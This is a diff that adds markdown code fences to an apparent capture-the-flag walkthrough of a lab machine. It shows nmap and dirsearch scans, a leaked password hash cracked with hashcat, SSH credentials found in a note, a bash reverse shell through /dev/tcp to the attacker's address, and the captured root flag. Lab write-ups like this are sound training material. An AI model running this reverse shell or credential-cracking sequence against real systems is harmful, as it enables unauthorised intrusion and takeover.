@@ -1,3 +1,5 @@
+
+```basic
 ┌──(kali㉿kali)-[~]
 └─$ nmap -sV -A 10.10.19.1              
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-29 10:58 EDT
@@ -18,14 +20,14 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 25.20 seconds
 
-
+```
 
 http://10.10.19.1/etc/squid/passwd
 
-music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
+```music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.```
 
 
-
+```basic
 ┌──(kali㉿kali)-[~/dirsearch]
 └─$ python3 dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.19.1   
 /home/kali/dirsearch/thirdparty/requests/__init__.py:91: RequestsDependencyWarning: urllib3 (1.26.4) or chardet (4.0.0) doesn't match a supported version!
@@ -107,18 +109,18 @@ Candidates.#1....: stella123 -> sextoy
 
 Started: Sat May 29 12:07:41 2021
 Stopped: Sat May 29 12:08:09 2021
- 
+```
  
  
 so download borg,,, extracted backup with password from hashcat
 
-
+```
 ┌──(kali㉿kali)-[~/Downloads/home/alex/Documents]
 └─$ cat note.txt   
 Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!
 
 alex:S3cretP@s3
- 
+``` 
  
 we get ssh access
 
@@ -137,13 +139,13 @@ we create a bash reverse shell
 
 set up nc listner ,
 
-
+```basic
 export RHOST=10.6.65.43
 export RPORT=12345
 bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'
+```
 
-
-                                                                                                                                                                         
+ ```bash                                                                                                                                                                        
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ nc -lnvp 12345                                                                                                                                                   1 ⨯
 listening on [any] 12345 ...
@@ -156,5 +158,5 @@ root.txt
 root@ubuntu:/root# cat root.txt
 cat root.txt
 flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
-root@ubuntu:/root#                                                                                                                                                                          
+root@ubuntu:/root#                                       ```                                                                                                                                 
 
